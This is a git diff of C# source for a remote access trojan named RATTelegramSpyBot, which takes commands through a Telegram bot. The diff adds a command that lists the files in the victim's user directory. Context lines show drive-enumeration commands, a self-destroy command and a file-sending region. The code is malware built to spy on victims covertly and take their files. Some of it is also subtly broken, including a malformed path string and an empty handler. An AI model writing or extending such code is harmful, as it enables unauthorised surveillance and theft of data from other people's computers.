@@ -7,8 +7,10 @@ using System.Threading;
 using Telegram.Bot;
 using Telegram.Bot.Args;
 using Telegram.Bot.Requests;
+using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.ReplyMarkups;
+using File = System.IO.File;
 
 namespace RATTelegramSpyBot {
     class MainRAT {
@@ -58,12 +60,13 @@ namespace RATTelegramSpyBot {
 
         // Zona Importante 
         private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
-
+            #region Declare variables
             var message = messageEventArgs.Message;
+            string UserName = Features.getUserName();
             if (message == null || message.Type != MessageType.Text) return;
             string Command = message.Text.Split(' ').First();           // Case "Comando"
             Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
-
+            #endregion
             switch (message.Text.Split(' ').First()) {
                 case "/Status":         // Verifica si estamos en linea
                     #region /Status
@@ -127,6 +130,18 @@ namespace RATTelegramSpyBot {
                     Path = "";
                     break;
                 #endregion
+                case "/Dir_CurrentUserFiles":
+                    #region
+                    ListarFiles(@"C: \Users\" + UserName);
+                    SendBotMessage("Finish Command");
+                    break;
+                    #endregion
+                case "/Dir_CurrentUserFolders":
+                    #region
+                    
+                    break;
+                #endregion
+
                 case "/Dir_FolderDisk": // Lista Ruta de discos especificos
                     #region /Dir_FolderDisk
                     var Disk = new InlineKeyboardMarkup(new[]{
@@ -330,7 +345,6 @@ namespace RATTelegramSpyBot {
                 case "DDW":    GetDirectoryAll(@"W:\"); SendBotMessage("Finish Command"); break;
                 case "DDX":    GetDirectoryAll(@"X:\"); SendBotMessage("Finish Command"); break;
                 case "DDZ":    GetDirectoryAll(@"Z:\"); SendBotMessage("Finish Command"); break;
-
                 // Destroy RAT Telegram
 
                 case "DestroyRATTrue":
@@ -340,17 +354,6 @@ namespace RATTelegramSpyBot {
                 case "DestroyRATFalse": 
                     SendBotMessage("Destroy RAT |Denied| "); 
                     break;
-
-
-
-
-
-
-
-
-
-
-
 
                 #region Cases de envío de archivos mediante red 
 
